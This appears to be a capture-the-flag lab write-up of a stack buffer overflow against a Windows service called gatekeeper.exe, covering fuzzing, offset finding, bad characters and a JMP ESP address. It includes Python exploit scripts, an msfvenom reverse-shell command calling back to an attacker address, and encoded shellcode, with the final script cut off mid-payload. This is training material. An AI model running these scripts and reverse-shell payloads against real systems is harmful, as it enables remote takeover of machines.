

---

### Deploy Machine and Scan Network

- ![image](https://user-images.githubusercontent.com/94720207/169709884-f10463c3-49fe-47b6-b23a-4c7b29199467.png)

- ![image](https://user-images.githubusercontent.com/94720207/169717460-dcdb093d-f04a-4121-b3f4-472e33a22289.png)

- ![image](https://user-images.githubusercontent.com/94720207/169636850-2f3d5382-d440-4761-9dc2-d9acc64dc4d2.png)

- ![image](https://user-images.githubusercontent.com/94720207/169636867-93df1b45-60a1-45d5-85ce-7dd9eb2aac5c.png)


---

### Services Enumeration

- `smbclient -N -L \\\\$ip_target\\`

- ![image](https://user-images.githubusercontent.com/94720207/169636978-f9fc5e1c-08a2-4e13-a051-7b259bcf8ff4.png)

    - **"Users" share is available for login without password, let's sniff inside.**

- `smbclient -N -L \\\\$ip_target\\Users`

    - I've found the executable `gatekeeper.exe` I will download it and prepare the `Buffer Overflow Lab` in my own bare metal Windows 10. 

- ![image](https://user-images.githubusercontent.com/94720207/169637348-142c6a3f-de24-4c58-8bee-b1c7c6046552.png)

---

### Mona Configuration

- The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    - `!mona config -set workingfolder c:\mona\%p`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169673777-cf70c41e-5ce9-445f-885a-77515903a49b.png)
 
---

### Launching gatekeeper.exe

- Launch as admin `gatekeeper.exe` server:

   - ![image](https://user-images.githubusercontent.com/94720207/169685198-48829607-a781-45da-8271-456b697e2262.png)

- Testing connection from a `netcat` - `nc -nv 192.168.1.100 31337` :

    - ![image](https://user-images.githubusercontent.com/94720207/169685595-e1591e28-1289-4c0e-b907-9701a7bf3ba9.png)

- Attach `gatekeeper.exe` to `Immunity Debugger`

    - ![image](https://user-images.githubusercontent.com/94720207/169685344-36efbd2d-0f4a-47ae-a94e-6f1d50a32fdb.png)
  
- Lock and Loaded!

---

### 1. Fuzzing

- First of all, I will run `gatekeeper.exe` as administrator and then start `Immunity Debugger` and attach the program. 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169637970-252158e3-9967-41e1-a6ac-587a548bde3f.png)

    - ![image](https://user-images.githubusercontent.com/94720207/169637996-c25fa35e-bcd9-4026-b12b-110bc8870e04.png)

- Then, I will run the Immunity Debugger with "play".

    - ![image](https://user-images.githubusercontent.com/94720207/169638036-2ab7bd99-0fea-484a-af2f-7c2e09a96df6.png)

        - Running and ready to go!

- On Kali Linux:

    1. Connect to `gatekeeper.exe`:
        
        - Using the IP Address of the Windows Machine **192.168.10.100** + gatekeeper.exe Port **31337** (We've seen that port on `nmap` typing "help, help, help")
            
        - ![image](https://user-images.githubusercontent.com/94720207/169188519-02fab4e5-91e4-4272-a788-9239ad878c4a.png)
           
        - On Kali: `nc -nv 192.168.1.100 31337`
            
        - ![image](https://user-images.githubusercontent.com/94720207/169638159-af1130de-075d-47b0-b6ab-a43b1ca45838.png)
 
 - **It looks that this program `Gatekeeper` take commands based on what you type AKA `strings` to generate an `answer` with the instruction `Hello ("%variable%")!!!`**
  
     - This means, maybe the buffer overflow and/or the pointer of `EIP` that we need to exploit is located there, maybe I need to send 100 bytes of characters, maybe 3000...who knows!?
     
     - So, **we will do our `fuzzing` process to know how many bytes (characters) do we need to crash the program `gatekeeper.exe`**
     
- **As difference with `Vuln Server` Lab, here we are NOT using commands, just a string to make the `gatekeeper server` respond with a `string`**

    - **So, instead of using **`generic_send_tcp`** technique and spiking the strings, I will write a simple python script doing the following large strings and "jump" the spiking process, I really don't care very much being so precise with the breaking point at this moment, so I will only spam thousands of bytes and see what happen.**
    
```python
#!/usr/bin/python

    # Command: python3 -c 'print ("A" * 5000)'

print ('A' * 5000)
```

- Or just using a python command:

    - `python3 -c 'print ("A" * 5000)'` 

- With this simple script we will generate 5000 bytes of "A's" at once:

    - ![image](https://user-images.githubusercontent.com/94720207/169703432-c792cfff-9b98-4475-bd8f-9332af2a3c63.png)

- And we will copy and paste it to the program, it's just like a basic "manual fuzzing" and then press `enter`:

    - ![image](https://user-images.githubusercontent.com/94720207/169638479-071a4226-18aa-4c60-8247-eeef445f0750.png)

- BOOM!!! We did it!!! The `chatserver.exe` have just crashed, it means the `buffer space` of "message" is not sanitized and we can exploit it. 

    - ![image](https://user-images.githubusercontent.com/94720207/169638574-63ddd521-886b-4327-a82b-c0bfdff6feb1.png)

- Bota fixa papai!

    - If we look at `EBP` we can see `41414141`: THAT'S THE HEX CODE FOR: `AAAA`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169456928-65563691-936f-441c-9ade-edf2f7c31752.png) 

    - Also, we went over `ESP` with a bunch of "A"

    - Finally, we get into `EIP` too with `41414141`: THA'TS THE HEX CODE FOR: `AAAA`

- Remember: **The `EIP` is the important factor!**

    - If we control `EIP` we can point somethin malicious! But for that, we need to locate "where's `EIP` now?"

- NOTE: The program has crashed, so we will need to restart the `Gatekeeper Server` and attach it again to the `Immunity Debugger`

    - **It's better to close everything and start from 0 to avoid errors** 

- We already know that the program `Gatekeeper Server` can crash somewhere if we send a string overflow of 5000 bytes (A's)

- **As difference with `vuln server` we did this process a lot quickier, that's because in this scenario we did not needed `spiking` adn threw random 5000 bytes at once, maybe not so much precise as `spiking` but it's fasterr.**

    - **With just a bunch of "A's" we did realize that the string can crash the program, that means now we need to `find the offset`
    
- we just need to know aprox where we crashed the program, and we know is somewhere around **less than 5000 bytes**

    - Now, that we know that the crash is somewhere less 5000 bytes, we need to know: **where's the `EIP` value at?**

    - Remember, controlling the `EIP` is the puprose of all of this attack. 

### Results

1. **Crashing with `5000` bytes flooding at once**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---  

### 2. Finding the Offset

- First of all, restart everything because the last crash...

- We are going to be looking for where the overwirte the `EIP`: 

    - Because controlling EIP means control the shellcode of the program (so we can send malicious scripts like a reverse shell).
    
- **For this step, we will use the tool `pattern_create` by Metasploit:**

    - In Kali machine (-l is for lenght):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169657801-7163e03f-ad5e-4de0-accc-f963221b781b.png)
 
        - Now, instead of sending a bunch of `A`'s we will send the "crazy code", or better said, the pattern algorythm to find the offset.
        
            - **Note: Again, the difference with `vuln server` is that we don't need a string before or `Suffix`, just copy and paste the pattern just like we did with the A's**
            
        - ![image](https://user-images.githubusercontent.com/94720207/169657959-c9040268-2d11-4088-9bcb-1c85ae828abe.png)
        
            - We crashed the `gatekeeper.exe` again, this time with the pattern:
            
        - ![image](https://user-images.githubusercontent.com/94720207/169658066-3761e84e-fbe0-4f81-90e5-1e258f7cf214.png)
 
 - When we send that crazy string we going to get the value on the `EIP` like magic, but how it works?

    1. We send the "crazy code" and we know that in some point it will crash (because it have 5000 bytes and we know it crashes at some point).
    
        - **That "crazy code" is actually a pattern alogythm of characters, so Metasploit can identify the bytes where the crash exactly happened! booom!!!**
    
    3. After the crash, we going to say to Metasppoit:
    
        - **The program have crashed with the `pattern_create`, identify exactly where it crashed, plz! :3.**    

    - Just like in fuzzing: We sent _"TRUN /.:/ Cr4zyCodeCr4zyCodeCodeCr4zyCode..."_ (instead of A's) and matched "the perfect world"
    - We also overwrite `ESP`, `EBP` and `EIP`.
    - It's very similar to the A's, **but in this case we used the Metasploit character `pattern_creator` AKA "the crazy code"**
    
        - NOTE: We can know that we passed by far the crash zone (just like with A's) because we can see a large string on ESP-
        - Remember!: 
        
            1. The perfect world is the large string in `EAX`
            2. Any other large string means that we overwrite that register (`ESP`) by a looooot of chars 
            3. But, the important thing here is that we overwrite `EIP`
        
                - ![image](https://user-images.githubusercontent.com/94720207/169658161-98e52e8c-8083-49af-98da-ba77092e8d56.png)
       
            - **The important and critic value here then is the `EIP`:**
            
                - **`39654138`** 
                            
            - Let's use this value to abuse the vulnerability!

- This step is similar to the last one, but instead of using `pattern_create` tool, we will use `pattern_offset`:

- ![image](https://user-images.githubusercontent.com/94720207/169327203-1bd951d1-a149-4e20-ba65-cecb5cad7020.png)

    - In Kali machine (-l is for lenght), (-q is for query, our finding of the exact **pattern**):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50000 -q 39654138`
   
    - After we press "enter", we should find a **pattern offset**:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169658272-bd4dbdcc-d60d-432d-a619-5aa86f752195.png)
        
            - **NOTE: We have 3 different exact matches this time (in vuln server or brainstorm there was only 1 at more than `2000` bytes), this is because the real offset is very close to the beginning `146` bytes, this means that 5000 bytes for fuzzing were too much! I needed just 200 to test maybe...**
            
            - **That's why spiking is used!!! With spiking before fuzzing I would know that the offset would be near from 200 maybe, but I've decided to trhow randomly 5000 chars at once. 
            
            - That's why I used 5000 bytes again in this lab, so spiking is now clear! :D**  
        
            - **This information is critical, because this means that exactly at `146 bytes`, we can control `EIP` overwriting it**

### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 3. Controlling EIP

1. Create a new python script called `overflow_gatekeeper_controllingEIP.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**.
  
    - Offset: `146` bytes 

2. Set the `payload` variable to an **empty string**. 

3. Set the `retn` variable to `BBBB`.

    - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 

- **Note: Executing the next script is not necessary for the exploit, so, from here you can only make the script and save it for the next step**

- Create:

    - `overflow_gatekeeper_controllingEIP.py` (chmod +x)

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
- ![image](https://user-images.githubusercontent.com/94720207/169703776-31ae3bba-3102-4c62-9d05-89c594ec9eeb.png)

    - **Execute it:**

        - **`python3 overflow1_step3_controllingEIP.py`**
    
    - ![image](https://user-images.githubusercontent.com/94720207/169703821-6b445a04-2d58-443b-ac0d-0f75d66db579.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169703863-9ec7cd5c-b6e5-4439-a5ba-6efe93aa274c.png)

- The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

3. **Controlling EIP adding `BBBB` / `42424242` at offset `146` +1+2+3+4 bytes**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 4. Finding Bad Characters

- Generate a `bytearray` using `mona`, and **exclude the null byte `\x00` by default.** 

- Note the location of the `bytearray.bin` file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be `C:\mona\oscp\bytearray.bin`).

    - `!mona bytearray -b "\x00"`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169704314-ca5db20a-8f20-4e71-9147-019d27b2712e.png)
    
- Now, generate a string of bad chars from \x01 to \xff**:

- Now, generate a string of bad chars from \x01 to \xff**:

```python
# Byte Array (badchars) creator

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

- Now, generate a **string of bad chars** that is **identical to the bytearray** (or just use the next I made:). 

- ![image](https://user-images.githubusercontent.com/94720207/169704736-97989534-ba56-40d8-9794-7771c98cb418.png)
 
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

- Create `overflow_gatekeeper_find_badchars.py` script and set the `payload` variable **to the string of bad chars the script generates.**

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```    

- ![image](https://user-images.githubusercontent.com/94720207/169704833-feaa56fd-938f-4919-89dc-1db656a4b913.png)

- Step by step:

    - Execute first time script:
        
        - **`python3 overflow_gatekeeper_find_badchars.py`**

1. Run the python script for first time with all the badchars from \x01 to \xFF:

    - ![image](https://user-images.githubusercontent.com/94720207/169704921-f00766c9-4181-4f66-8d82-f93bd1fe0a0c.png)
        
    - ![image](https://user-images.githubusercontent.com/94720207/169704965-7fc65885-85be-4e81-a262-124a942f3863.png)
 
2. **Make a note of the address to which the `ESP` register points:

    - **ESP points: `007619E4`**
    
        - **In this lab is easier to find the badchar only by sight, no need of mona module**
        
        - **First, I only saw default \x00 but is also missing \x0a** 
        
            - ![image](https://user-images.githubusercontent.com/94720207/169705105-708803aa-66db-42dc-bf39-29e18605d93c.png)
            
            - ![image](https://user-images.githubusercontent.com/94720207/169707089-c804d0f5-3114-4dd3-819e-a3caeea68e6f.png)
       
3. Then update the `payload` variable in your `overflow_gatekeeper_find_badchars.py` script and remove the **new badchars** `"\x00\x0a"`.

    - ![image](https://user-images.githubusercontent.com/94720207/169707232-2358b69a-7b92-4b7b-8975-f9acda3c5ece.png)

```python
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
 
### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

3. **Controlling EIP adding `BBBB` / `42424242` at offset `146` +1+2+3+4 bytes**

4. **Badchars found: `\x00\x0a`**

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 4. Finding a Jump Point

- With the `gatekeeper.exe` either **running or in a crashed state**, run the following `mona` command...

    - **Making sure to update the `-cpb` option with all the `badchars` you identified (including `\x00`)**:

        - `!mona jmp -r esp -cpb "\x00\x0A"`

    - This command finds all `JMP ESP` (or equivalent) instructions with addresses that don't contain any of the badchars specified. 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169707638-078616e6-e895-45e5-9147-fe5e7583dda5.png)
    
    - Other option with the same result is using the command:
    
        - `!mona jmp -r esp -m gatekeeper.exe`  
     
    - ![image](https://user-images.githubusercontent.com/94720207/169707718-26599070-60be-4358-8bf1-fcf20cf9b601.png)

    - The results should display in the `Log data` window (use the Window menu to switch to it if needed).

    - Choose an address and update your python script with the new `overflow1_step4_findJumpPoint.py` script.
    
        - 1st Address/Pointer: `080414C3` 
    
        - Set the `retn` variable to the address, written `"special backwards"` (since the system is `little endian`). 
        
            - **For example:**
            
                - If the address is `\x01\x02\x03\x04` 
                
                - in Immunity, write it as `\x04\x03\x02\x01` in your exploit.
            
            - **Reversing `little indian`:**
            
                - Normal: `080414C3`
                
                - Separate Normal: `08 04 14 C3`
                
                - Reversed pair: `C3 14 04 08`
                
                - Final Result: `"\xC3\x14\x04\x08"` 
            
            - **`retn` = `"\xC3\x14\x04\x08"`**     

- Create file: `overflow1_step4_findJumpPoint.py`

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

- ![image](https://user-images.githubusercontent.com/94720207/169707924-f8e313b0-f269-42c2-959f-95daa555b5cc.png)

### Results

1. **Crashing with `5000` bytes flooding at once**

2. **Crashing with an exact offset of `146` bytes**

3. **Controlling EIP adding `BBBB` / `42424242` at offset `146` +1+2+3+4 bytes**

4. **Badchars found: `\x00\x0A`**

5. **Found jump point `JPM ESP` = 080414C3 to little indian = `retn=\xC3\x14\x04\x08` ** 

    - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)

---

### 5. Generate the final Payload

- Run the following `msfvenom` command on Kali, using your Kali `VPN IP` as the `LHOST` and updating the `-b` option with all the badchars you identified (including `\x00`):

    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -b "\x00\x0A" -f c`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169708167-174b23c6-09f2-423a-a713-8d16a0003608.png)
 
- Copy the generated `C code strings` and integrate them into a new modifies python script called `overflow_gatekeeper_step567_Final_Payload.py` script `payload` variable

    - Create: `overflow_gatekeeper_step567_Final_Payload.py`:

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = ""
payload = "\xba\x1c\xf2\x98\x43\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\xda\xf6\x7a\xb6\x1e\x1e\xf8"
"\x39\xde\xdf\x9d\xb0\x3b\xee\x9d\xa7\x48\x41\x2e\xa3\x1c\x6e"
"\xc5\xe1\xb4\xe5\xab\x2d\xbb\x4e\x01\x08\xf2\x4f\x3a\x68\x95"
"\xd3\x41\xbd\x75\xed\x89\xb0\x74\x2a\xf7\x39\x24\xe3\x73\xef"
"\xd8\x80\xce\x2c\x53\xda\xdf\x34\x80\xab\xde\x15\x17\xa7\xb8"
"\xb5\x96\x64\xb1\xff\x80\x69\xfc\xb6\x3b\x59\x8a\x48\xed\x93"
"\x73\xe6\xd0\x1b\x86\xf6\x15\x9b\x79\x8d\x6f\xdf\x04\x96\xb4"
"\x9d\xd2\x13\x2e\x05\x90\x84\x8a\xb7\x75\x52\x59\xbb\x32\x10"
"\x05\xd8\xc5\xf5\x3e\xe4\x4e\xf8\x90\x6c\x14\xdf\x34\x34\xce"
"\x7e\x6d\x90\xa1\x7f\x6d\x7b\x1d\xda\xe6\x96\x4a\x57\xa5\xfe"
"\xbf\x5a\x55\xff\xd7\xed\x26\xcd\x78\x46\xa0\x7d\xf0\x40\x37"
"\x81\x2b\x34\xa7\x7c\xd4\x45\xee\xba\x80\x15\x98\x6b\xa9\xfd"
"\x58\x93\x7c\x51\x08\x3b\x2f\x12\xf8\xfb\x9f\xfa\x12\xf4\xc0"
"\x1b\x1d\xde\x68\xb1\xe4\x89\x56\xee\xe7\x0b\x3f\xed\xe7\x9a"
"\xe3\x78\x01\xf6\x0b\x2d\x9a\x6f\xb5\x74\x50\x11\x3a\xa3\x1d"
"\x11\xb0\x40\xe2\xdc\x31\x2c\xf0\x89\xb1\x7b\xaa\x1c\xcd\x51"
"\xc2\xc3\x5c\x3e\x12\x8d\x7c\xe9\x45\xda\xb3\xe0\x03\xf6\xea"
"\x5a\x31\x0b\x6a\xa4\xf1\xd0\x4f\x2b\xf8\x95\xf4\x0f\xea\x63"
"\xf4\x0b\x5e\x3c\xa3\xc5\x08\xfa\x1d\xa4\xe2\x54\xf1\x6e\x62"
"\x20\x39\xb1\xf4\x2d\x14\x47\x18\x9f\xc1\x1e\x27\x10\x86\x96"
"\x50\x4c\x36\x58\x8b\xd4\x56\xbb\x19\x21\xff\x62\xc8\x88\x62"
"\x95\x27\xce\x9a\x16\xcd\xaf\x58\x06\xa4\xaa\x25\x80\x55\xc7"
"\x36\x65\x59\x74\x36\xac"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

--- 

### Prepend NOPs / Padding

- Since an **encoder was likely used to generate the payload**, you will need some **space in memory for the payload to unpack itself**. 

    - **You can do this by setting the `padding` variable to a string of `16 or more` `"No Operation"` (`\x90`) bytes:

        - `padding = "\x90" * 16`
        
- Add this to the `overflow_gatekeeper_step567_Final_Payload.py` script:

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 16
payload = "\xba\x1c\xf2\x98\x43\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\xda\xf6\x7a\xb6\x1e\x1e\xf8"
"\x39\xde\xdf\x9d\xb0\x3b\xee\x9d\xa7\x48\x41\x2e\xa3\x1c\x6e"
"\xc5\xe1\xb4\xe5\xab\x2d\xbb\x4e\x01\x08\xf2\x4f\x3a\x68\x95"
"\xd3\x41\xbd\x75\xed\x89\xb0\x74\x2a\xf7\x39\x24\xe3\x73\xef"
"\xd8\x80\xce\x2c\x53\xda\xdf\x34\x80\xab\xde\x15\x17\xa7\xb8"
"\xb5\x96\x64\xb1\xff\x80\x69\xfc\xb6\x3b\x59\x8a\x48\xed\x93"
"\x73\xe6\xd0\x1b\x86\xf6\x15\x9b\x79\x8d\x6f\xdf\x04\x96\xb4"
"\x9d\xd2\x13\x2e\x05\x90\x84\x8a\xb7\x75\x52\x59\xbb\x32\x10"
"\x05\xd8\xc5\xf5\x3e\xe4\x4e\xf8\x90\x6c\x14\xdf\x34\x34\xce"
"\x7e\x6d\x90\xa1\x7f\x6d\x7b\x1d\xda\xe6\x96\x4a\x57\xa5\xfe"
"\xbf\x5a\x55\xff\xd7\xed\x26\xcd\x78\x46\xa0\x7d\xf0\x40\x37"
"\x81\x2b\x34\xa7\x7c\xd4\x45\xee\xba\x80\x15\x98\x6b\xa9\xfd"
"\x58\x93\x7c\x51\x08\x3b\x2f\x12\xf8\xfb\x9f\xfa\x12\xf4\xc0"
"\x1b\x1d\xde\x68\xb1\xe4\x89\x56\xee\xe7\x0b\x3f\xed\xe7\x9a"
"\xe3\x78\x01\xf6\x0b\x2d\x9a\x6f\xb5\x74\x50\x11\x3a\xa3\x1d"
"\x11\xb0\x40\xe2\xdc\x31\x2c\xf0\x89\xb1\x7b\xaa\x1c\xcd\x51"
"\xc2\xc3\x5c\x3e\x12\x8d\x7c\xe9\x45\xda\xb3\xe0\x03\xf6\xea"
"\x5a\x31\x0b\x6a\xa4\xf1\xd0\x4f\x2b\xf8\x95\xf4\x0f\xea\x63"
"\xf4\x0b\x5e\x3c\xa3\xc5\x08\xfa\x1d\xa4\xe2\x54\xf1\x6e\x62"
"\x20\x39\xb1\xf4\x2d\x14\x47\x18\x9f\xc1\x1e\x27\x10\x86\x96"
"\x50\x4c\x36\x58\x8b\xd4\x56\xbb\x19\x21\xff\x62\xc8\x88\x62"
"\x95\x27\xce\x9a\x16\xcd\xaf\x58\x06\xa4\xaa\x25\x80\x55\xc7"
"\x36\x65\x59\x74\x36\xac"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

---

### Exploit!!! Que chille!

- Checklist for correct variables: 

    1. prefix (_not needed in Gatekeeper Lab_)
    2. offset
    3. return address (retn)
    4. padding
    5. payload set

- **Final Payload Script = `overflow_gatekeeper_step567_Final_Payload.py`**

```python
import socket

ip = "192.168.1.100"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xba\x1c\xf2\x98\x43\xda\xc5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\xda\xf6\x7a\xb6\x1e\x1e\xf8"
"\x39\xde\xdf\x9d\xb0\x3b\xee\x9d\xa7\x48\x41\x2e\xa3\x1c\x6e"
"\xc5\xe1\xb4\xe5\xab\x2d\xbb\x4e\x01\x08\xf2\x4f\x3a\x68\x95"
"\xd3\x41\xbd\x75\xed\x89\xb0\x74\x2a\xf7\x39\x24\xe3\x73\xef"
"\xd8\x80\xce\x2c\x53\xda\xdf\x34\x80\xab\xde\x15\x17\xa7\xb8"
"\xb5\x96\x64\xb1\xff\x80\x69\xfc\xb6\x3b\x59\x8a\x48\xed\x93"
"\x73\xe6\xd0\x1b\x86\xf6\x15\x9b\x79\x8d\x6f\xdf\x04\x96\xb4"
"\x9d\xd2\x13\x2e\x05\x90\x84\x8a\xb7\x75\x52\x59\xbb\x32\x10"
